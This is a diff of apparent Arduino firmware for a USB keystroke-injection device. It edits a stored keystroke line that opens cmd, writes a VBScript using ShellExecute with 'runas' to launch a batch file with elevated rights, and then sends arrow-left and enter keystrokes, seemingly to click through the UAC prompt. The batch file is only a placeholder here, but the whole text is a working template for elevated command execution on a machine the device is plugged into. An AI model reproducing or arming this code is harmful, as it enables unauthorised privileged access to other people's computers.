@@ -7,7 +7,7 @@ const char fn_run[] PROGMEM = "}";
 
 // store instructions in flash memory and read sequentially to save sram
 const char line_0[] PROGMEM = "@@@@";
-const char line_1[] PROGMEM = "cmd /k cd %temp%&echo|set /p=\"CreateObject(\"Shell.Application\").ShellExecute \"script.bat\",,\"\",\"runas\",1\">script.vbs&echo set /p DUMMY=Hit ENTER to continue...>script.bat&script.vbs&exit";
+const char line_1[] PROGMEM = "cmd /k cd %temp%&echo|set /p=\"CreateObject(\"Shell.Application\").ShellExecute \"script.bat\",,\"\",\"runas\",1\">script.vbs&echo|set /p=\"@echo off&set /p DUMMY=Hit ENTER to continue...\">script.bat&script.vbs&exit";
 
 // instruction lookup table (execution order: left to right)
 const char *const line_table[] PROGMEM = { fn_run, line_0, line_1, key_enter, line_0, key_arrow_left, line_0, key_enter };
